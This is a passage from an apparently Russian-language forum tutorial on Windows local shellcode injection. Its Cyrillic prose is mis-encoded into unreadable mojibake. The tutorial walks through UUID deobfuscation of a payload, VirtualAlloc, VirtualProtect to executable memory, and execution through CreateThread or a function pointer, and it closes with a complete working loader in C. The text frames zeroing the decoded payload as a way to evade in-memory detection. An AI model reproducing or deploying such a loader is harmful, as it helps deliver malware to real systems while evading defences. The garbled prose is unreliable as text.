–ó–∞—Ç–µ–º –±–∞–π—Ç—ã –¥–µ–æ–±—Ñ—É—Å—Ü–∏—Ä–æ–≤–∞–Ω–Ω–æ–π –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –∫–æ–ø–∏—Ä—É—é—Ç—Å—è –≤ –Ω–æ–≤—ã–π –≤—ã–¥–µ–ª–µ–Ω–Ω—ã–π —Ä–µ–≥–∏–æ–Ω –ø–∞–º—è—Ç–∏ –ø–æ –∞–¥—Ä–µ—Å—É pShellcodeAddress, –∞ –∑–∞—Ç–µ–º pDeobfuscatedPayload –æ—á–∏—â–∞–µ—Ç—Å—è, –ø–µ—Ä–µ–∑–∞–ø–∏—Å—ã–≤–∞—è –µ–≥–æ –Ω—É–ª—è–º–∏. pDeobfuscatedPayload - —ç—Ç–æ –±–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å, –≤—ã–¥–µ–ª–µ–Ω–Ω—ã–π –∫—É—á–µ–π —Ñ—É–Ω–∫—Ü–∏–µ–π UuidDeobfuscation, –∫–æ—Ç–æ—Ä–∞—è –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –±–∞–π—Ç—ã —Å—ã—Ä–æ–π –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ shellcode. –û–Ω –±—ã–ª –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞–Ω –Ω—É–ª—è–º–∏, —Ç–∞–∫ –∫–∞–∫ –±–æ–ª—å—à–µ –Ω–µ —Ç—Ä–µ–±—É–µ—Ç—Å—è, –∏, —Ç–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, —ç—Ç–æ —Å–Ω–∏–∑–∏—Ç –≤–µ—Ä–æ—è—Ç–Ω–æ—Å—Ç—å –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –≤ –ø–∞–º—è—Ç–∏ —Å–∏—Å—Ç–µ–º–∞–º–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏.<br />
<br />
<b>–ò–∑–º–µ–Ω–µ–Ω–∏–µ –∑–∞—â–∏—Ç—ã –ø–∞–º—è—Ç–∏</b><br />
<br />
–ü–µ—Ä–µ–¥ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ–º –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –∏–∑–º–µ–Ω–∏—Ç—å –∑–∞—â–∏—Ç—É –ø–∞–º—è—Ç–∏, —Ç–∞–∫ –∫–∞–∫ –≤ –¥–∞–Ω–Ω—ã–π –º–æ–º–µ–Ω—Ç —Ä–∞–∑—Ä–µ—à–µ–Ω–∞ —Ç–æ–ª—å–∫–æ –æ–ø–µ—Ä–∞—Ü–∏—è —á—Ç–µ–Ω–∏—è/–∑–∞–ø–∏—Å–∏. VirtualProtect –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –∏–∑–º–µ–Ω–µ–Ω–∏—è –∑–∞—â–∏—Ç—ã –ø–∞–º—è—Ç–∏, –∏ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –µ–π –ø–æ–Ω–∞–¥–æ–±–∏—Ç—Å—è –ª–∏–±–æ PAGE_EXECUTE_READ, –ª–∏–±–æ PAGE_EXECUTE_READWRITE.<br />
<br />
–§—É–Ω–∫—Ü–∏—è VirtualProtect WinAPI –≤—ã–≥–ª—è–¥–∏—Ç —Å–ª–µ–¥—É—é—â–∏–º –æ–±—Ä–∞–∑–æ–º –Ω–∞ –æ—Å–Ω–æ–≤–µ –µ–µ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏–∏:<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL VirtualProtect(
  [in]  LPVOID lpAddress,       // –ë–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å —Ä–µ–≥–∏–æ–Ω–∞ –ø–∞–º—è—Ç–∏, –¥–æ—Å—Ç—É–ø –∫ –∫–æ—Ç–æ—Ä–æ–º—É –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –∏–∑–º–µ–Ω–µ–Ω
  [in]  SIZE_T dwSize,          // –†–∞–∑–º–µ—Ä —Ä–µ–≥–∏–æ–Ω–∞, –∞—Ç—Ä–∏–±—É—Ç—ã –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–æ—Ç–æ—Ä–æ–º—É –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å –∏–∑–º–µ–Ω–µ–Ω—ã, –≤ –±–∞–π—Ç–∞—Ö
  [in]  DWORD  flNewProtect,    // –ù–æ–≤—ã–π –ø–∞—Ä–∞–º–µ—Ç—Ä –∑–∞—â–∏—Ç—ã –ø–∞–º—è—Ç–∏
  [out] PDWORD lpflOldProtect   // –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é &#039;DWORD&#039;, –∫–æ—Ç–æ—Ä–∞—è –ø–æ–ª—É—á–∞–µ—Ç –ø—Ä–µ–¥—ã–¥—É—â–µ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –¥–æ—Å—Ç—É–ø–∞ –∫ –∑–∞—â–∏—Ç–µ &#039;lpAddress&#039;
);</code></pre>
	</div>
</div><br />
–•–æ—Ç—è –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ shellcode —Ç—Ä–µ–±—É—é—Ç PAGE_EXECUTE_READWRITE, —Ç–∞–∫–∏–µ –∫–∞–∫ —Å–∞–º–æ—Ä–∞—Å—à–∏—Ñ—Ä–æ–≤—ã–≤–∞—é—â–∏–π—Å—è shellcode, –¥–ª—è Msfvenom x64 calc shellcode —ç—Ç–æ –Ω–µ —Ç—Ä–µ–±—É–µ—Ç—Å—è, –Ω–æ –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω—ã–π –Ω–∏–∂–µ —Ñ—Ä–∞–≥–º–µ–Ω—Ç –∫–æ–¥–∞ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —ç—Ç—É –∑–∞—â–∏—Ç—É –ø–∞–º—è—Ç–∏.<br />
<br />
<b>–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ —á–µ—Ä–µ–∑ CreateThread</b><br />
<br />
–ù–∞–∫–æ–Ω–µ—Ü, –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –ø—É—Ç–µ–º —Å–æ–∑–¥–∞–Ω–∏—è –Ω–æ–≤–æ–≥–æ –ø–æ—Ç–æ–∫–∞ —Å –ø–æ–º–æ—â—å—é —Ñ—É–Ω–∫—Ü–∏–∏ CreateThread Windows API –∏ –ø–µ—Ä–µ–¥–∞—á–∏ pShellcodeAddress, –∫–æ—Ç–æ—Ä—ã–π —è–≤–ª—è–µ—Ç—Å—è –∞–¥—Ä–µ—Å–æ–º shellcode.<br />
<br />
–§—É–Ω–∫—Ü–∏—è CreateThread WinAPI –≤—ã–≥–ª—è–¥–∏—Ç —Å–ª–µ–¥—É—é—â–∏–º –æ–±—Ä–∞–∑–æ–º –Ω–∞ –æ—Å–Ω–æ–≤–µ –µ–µ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏–∏:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>HANDLE CreateThread(
  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,    // –£—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –≤ NULL - –Ω–µ–æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ
  [in]            SIZE_T                  dwStackSize,           // –£—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –≤ 0 - –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é
  [in]            LPTHREAD_START_ROUTINE  lpStartAddress,        // –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ —Ñ—É–Ω–∫—Ü–∏—é, –∫–æ—Ç–æ—Ä–∞—è –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ –ø–æ—Ç–æ–∫–æ–º, –≤ –Ω–∞—à–µ–º —Å–ª—É—á–∞–µ —ç—Ç–æ –±–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏
  [in, optional]  __drv_aliasesMem LPVOID lpParameter,           // –£–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é, –∫–æ—Ç–æ—Ä–∞—è –±—É–¥–µ—Ç –ø–µ—Ä–µ–¥–∞–Ω–∞ —Ñ—É–Ω–∫—Ü–∏–∏, –≤—ã–ø–æ–ª–Ω—è–µ–º–æ–π (—É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –≤ NULL - –Ω–µ–æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ)
  [in]            DWORD                   dwCreationFlags,       // –£—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –≤ 0 - –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é
  [out, optional] LPDWORD                 lpThreadId             // —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é &#039;DWORD&#039;, –∫–æ—Ç–æ—Ä–∞—è –ø–æ–ª—É—á–∞–µ—Ç ID –ø–æ—Ç–æ–∫–∞ (—É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –≤ NULL - –Ω–µ–æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ)
);</code></pre>
	</div>
</div><br />
<b>–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ —á–µ—Ä–µ–∑ —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ —Ñ—É–Ω–∫—Ü–∏—é</b><br />
<br />
–í –∫–∞—á–µ—Å—Ç–≤–µ –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤—ã —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –±–æ–ª–µ–µ –ø—Ä–æ—Å—Ç–æ–π —Å–ø–æ—Å–æ–± –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è shellcode –±–µ–∑ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è Windows API CreateThread. –í –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω–æ–º –Ω–∏–∂–µ –ø—Ä–∏–º–µ—Ä–µ shellcode –ø—Ä–∏–≤–æ–¥–∏—Ç—Å—è –∫ —É–∫–∞–∑–∞—Ç–µ–ª—é —Ñ—É–Ω–∫—Ü–∏–∏ VOID –∏ shellcode –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –∫–∞–∫ —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ —Ñ—É–Ω–∫—Ü–∏—é. –ö–æ–¥ –ø–æ —Å—É—Ç–∏ –ø–µ—Ä–µ—Ö–æ–¥–∏—Ç –∫ –∞–¥—Ä–µ—Å—É pShellcodeAddress.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>(*(VOID(*)()) pShellcodeAddress)();</code></pre>
	</div>
</div><br />
–≠—Ç–æ —ç–∫–≤–∏–≤–∞–ª–µ–Ω—Ç–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—é –∫–æ–¥–∞ –Ω–∏–∂–µ:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>typedef VOID (WINAPI* fnShellcodefunc)();       // –û–ø—Ä–µ–¥–µ–ª–µ–Ω–æ –ø–µ—Ä–µ–¥ –æ—Å–Ω–æ–≤–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–µ–π
    fnShellcodefunc pShell = (fnShellcodefunc) pShellcodeAddress;
    pShell();</code></pre>
	</div>
</div><br />
<b>CreateThread –ø—Ä–æ—Ç–∏–≤ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —á–µ—Ä–µ–∑ —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ —Ñ—É–Ω–∫—Ü–∏—é</b><br />
<br />
–•–æ—Ç—è –º–æ–∂–Ω–æ –≤—ã–ø–æ–ª–Ω–∏—Ç—å shellcode, –∏—Å–ø–æ–ª—å–∑—É—è –º–µ—Ç–æ–¥ —É–∫–∞–∑–∞—Ç–µ–ª—è –Ω–∞ —Ñ—É–Ω–∫—Ü–∏—é, —ç—Ç–æ, –∫–∞–∫ –ø—Ä–∞–≤–∏–ª–æ, –Ω–µ —Ä–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è. –°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã–π shellcode Msfvenom –∑–∞–≤–µ—Ä—à–∞–µ—Ç –≤—ã–∑—ã–≤–∞—é—â–∏–π –ø–æ—Ç–æ–∫ –ø–æ—Å–ª–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –µ–≥–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è. –ï—Å–ª–∏ shellcode –±—ã–ª –≤—ã–ø–æ–ª–Ω–µ–Ω —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –º–µ—Ç–æ–¥–∞ —É–∫–∞–∑–∞—Ç–µ–ª—è –Ω–∞ —Ñ—É–Ω–∫—Ü–∏—é, —Ç–æ –≤—ã–∑—ã–≤–∞—é—â–∏–π –ø–æ—Ç–æ–∫ –±—É–¥–µ—Ç –æ—Å–Ω–æ–≤–Ω—ã–º –ø–æ—Ç–æ–∫–æ–º, –∏ –ø–æ—ç—Ç–æ–º—É –≤–µ—Å—å –ø—Ä–æ—Ü–µ—Å—Å –∑–∞–≤–µ—Ä—à–∏—Ç—Å—è –ø–æ—Å–ª–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è shellcode.<br />
<br />
–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ shellcode –≤ –Ω–æ–≤–æ–º –ø–æ—Ç–æ–∫–µ –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–∞–µ—Ç —ç—Ç—É –ø—Ä–æ–±–ª–µ–º—É, –ø–æ—Ç–æ–º—É —á—Ç–æ –µ—Å–ª–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ shellcode –∑–∞–≤–µ—Ä—à–µ–Ω–æ, –Ω–æ–≤—ã–π —Ä–∞–±–æ—á–∏–π –ø–æ—Ç–æ–∫ –±—É–¥–µ—Ç –∑–∞–≤–µ—Ä—à–µ–Ω, –∞ –Ω–µ –æ—Å–Ω–æ–≤–Ω–æ–π –ø–æ—Ç–æ–∫, –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–∞—è –∑–∞–≤–µ—Ä—à–µ–Ω–∏–µ –≤—Å–µ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.<br />
<br />
<b>–û–∂–∏–¥–∞–Ω–∏–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ—Ç–æ–∫–∞</b><br />
<br />
–í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ shellcode —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –Ω–æ–≤–æ–≥–æ –ø–æ—Ç–æ–∫–∞ –±–µ–∑ –∫–æ—Ä–æ—Ç–∫–æ–π –∑–∞–¥–µ—Ä–∂–∫–∏ —É–≤–µ–ª–∏—á–∏–≤–∞–µ—Ç –≤–µ—Ä–æ—è—Ç–Ω–æ—Å—Ç—å –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –æ—Å–Ω–æ–≤–Ω–æ–≥–æ –ø–æ—Ç–æ–∫–∞ –¥–æ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Ä–∞–±–æ—á–µ–≥–æ –ø–æ—Ç–æ–∫–∞, –∫–æ—Ç–æ—Ä—ã–π –≤—ã–ø–æ–ª–Ω—è–µ—Ç shellcode, —á—Ç–æ –ø—Ä–∏–≤–æ–¥–∏—Ç –∫ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ–π —Ä–∞–±–æ—Ç–µ shellcode. –≠—Ç–æ—Ç —Å—Ü–µ–Ω–∞—Ä–∏–π –∏–ª–ª—é—Å—Ç—Ä–∏—Ä—É–µ—Ç—Å—è –≤ –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω–æ–º –Ω–∏–∂–µ —Ñ—Ä–∞–≥–º–µ–Ω—Ç–µ –∫–æ–¥–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>int main(){

    // ...

    CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL); // –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ shellcode
    return 0; // –û—Å–Ω–æ–≤–Ω–æ–π –ø–æ—Ç–æ–∫ –∑–∞–≤–µ—Ä—à–µ–Ω –¥–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ—Ç–æ–∫–∞, –∫–æ—Ç–æ—Ä—ã–π –≤—ã–ø–æ–ª–Ω—è–µ—Ç shellcode
}</code></pre>
	</div>
</div><br />
–í –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω–Ω–æ–π —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è getchar(), —á—Ç–æ–±—ã –ø—Ä–∏–æ—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –¥–æ —Ç–µ—Ö –ø–æ—Ä, –ø–æ–∫–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–∏—Ç –≤–≤–æ–¥. –í —Ä–µ–∞–ª—å–Ω—ã—Ö —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—è—Ö —Å–ª–µ–¥—É–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥—Ä—É–≥–æ–π –ø–æ–¥—Ö–æ–¥, –∫–æ—Ç–æ—Ä—ã–π –∏—Å–ø–æ–ª—å–∑—É–µ—Ç Windows API WaitForSingleObject –¥–ª—è –æ–∂–∏–¥–∞–Ω–∏—è —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ –≤—Ä–µ–º–µ–Ω–∏ –¥–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ—Ç–æ–∫–∞.<br />
<br />
–ü—Ä–∏–≤–µ–¥–µ–Ω–Ω—ã–π –Ω–∏–∂–µ —Ñ—Ä–∞–≥–º–µ–Ω—Ç –∫–æ–¥–∞ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç WaitForSingleObject –¥–ª—è –æ–∂–∏–¥–∞–Ω–∏—è –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Ç–æ–ª—å–∫–æ —á—Ç–æ —Å–æ–∑–¥–∞–Ω–Ω–æ–≥–æ –ø–æ—Ç–æ–∫–∞ –≤ —Ç–µ—á–µ–Ω–∏–µ 2000 –º–∏–ª–ª–∏—Å–µ–∫—É–Ω–¥ –ø–µ—Ä–µ–¥ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ–º –æ—Å—Ç–∞–≤—à–µ–≥–æ—Å—è –∫–æ–¥–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>HANDLE hThread = CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL);
WaitForSingleObject(hThread, 2000);

// –û—Å—Ç–∞–≤—à–∏–π—Å—è –∫–æ–¥</code></pre>
	</div>
</div><br />
–í –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω–æ–º –Ω–∏–∂–µ –ø—Ä–∏–º–µ—Ä–µ WaitForSingleObject –±—É–¥–µ—Ç –∂–¥–∞—Ç—å –≤–µ—á–Ω–æ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –Ω–æ–≤–æ–≥–æ –ø–æ—Ç–æ–∫–∞.<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>HANDLE hThread = CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL);
WaitForSingleObject(hThread, INFINITE);</code></pre>
	</div>
</div><br />
<b>–û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è</b><br />
<br />
–û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –∏—Å–ø–æ–ª—å–∑—É–µ—Ç UuidDeobfuscation –¥–ª—è –¥–µ–æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏, –∑–∞—Ç–µ–º –≤—ã–¥–µ–ª—è–µ—Ç –ø–∞–º—è—Ç—å, –∫–æ–ø–∏—Ä—É–µ—Ç shellcode –≤ —Ä–µ–≥–∏–æ–Ω –ø–∞–º—è—Ç–∏ –∏ –≤—ã–ø–æ–ª–Ω—è–µ—Ç –µ–≥–æ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>int main() {

    PBYTE       pDeobfuscatedPayload  = NULL;
    SIZE_T      sDeobfuscatedSize     = NULL;

    printf(&quot;[i] Injecting Shellcode The Local Process Of Pid: %d \n&quot;, GetCurrentProcessId());
    printf(&quot;[#] Press &lt;Enter&gt; To Decrypt ... &quot;);
    getchar();

    printf(&quot;[i] Decrypting ...&quot;);
    if (!UuidDeobfuscation(UuidArray, NumberOfElements, &amp;pDeobfuscatedPayload, &amp;sDeobfuscatedSize)) {
        return -1;
    }
    printf(&quot;[+] DONE !\n&quot;);
    printf(&quot;[i] Deobfuscated Payload At : 0x%p Of Size : %d \n&quot;, pDeobfuscatedPayload, sDeobfuscatedSize);

    printf(&quot;[#] Press &lt;Enter&gt; To Allocate ... &quot;);
    getchar();
    PVOID pShellcodeAddress = VirtualAlloc(NULL, sDeobfuscatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf(&quot;[!] VirtualAlloc Failed With Error : %d \n&quot;, GetLastError());
        return -1;
    }
    printf(&quot;[i] Allocated Memory At : 0x%p \n&quot;, pShellcodeAddress);

    printf(&quot;[#] Press &lt;Enter&gt; To Write Payload ... &quot;);
    getchar();
    memcpy(pShellcodeAddress, pDeobfuscatedPayload, sDeobfuscatedSize);
    memset(pDeobfuscatedPayload, &#039;\0&#039;, sDeobfuscatedSize);

    DWORD dwOldProtection = NULL;

    if (!VirtualProtect(pShellcodeAddress, sDeobfuscatedSize, PAGE_EXECUTE_READWRITE, &amp;dwOldProtection)) {
        printf(&quot;[!] VirtualProtect Failed With Error : %d \n&quot;, GetLastError());
        return -1;
    }

    printf(&quot;[#] Press &lt;Enter&gt; To Run ... &quot;);
    getchar();
    if (CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
        printf(&quot;[!] CreateThread Failed With Error : %d \n&quot;, GetLastError());
        return -1;
    }

    HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
    printf(&quot;[#] Press &lt;Enter&gt; To Quit ... &quot;);
    getchar();
    return 0;
}</code></pre>
	</div>
</div><br />
<b>–û—Å–≤–æ–±–æ–∂–¥–µ–Ω–∏–µ –ø–∞–º—è—Ç–∏</b><br />
<br />
VirtualFree - —ç—Ç–æ WinAPI, –∫–æ—Ç–æ—Ä—ã–π –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –æ—Å–≤–æ–±–æ–∂–¥–µ–Ω–∏—è —Ä–∞–Ω–µ–µ –≤—ã–¥–µ–ª–µ–Ω–Ω–æ–π –ø–∞–º—è—Ç–∏. –≠—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –≤—ã–∑–≤–∞–Ω–∞ —Ç–æ–ª—å–∫–æ –ø–æ—Å–ª–µ —Ç–æ–≥–æ, –∫–∞–∫ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –ø–æ–ª–Ω–æ—Å—Ç—å—é –∑–∞–≤–µ—Ä—à–µ–Ω–æ, –∏–Ω–∞—á–µ —ç—Ç–æ –º–æ–∂–µ—Ç –æ—Å–≤–æ–±–æ–¥–∏—Ç—å —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –∏ –≤—ã–∑–≤–∞—Ç—å —Å–±–æ–π –ø—Ä–æ—Ü–µ—Å—Å–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL VirtualFree(
  [in] LPVOID lpAddress,
  [in] SIZE_T dwSize,
  [in] DWORD  dwFreeType
);</code></pre>
	</div>
</div><br />
<b>–û—Ç–ª–∞–¥–∫–∞</b><br />
<br />
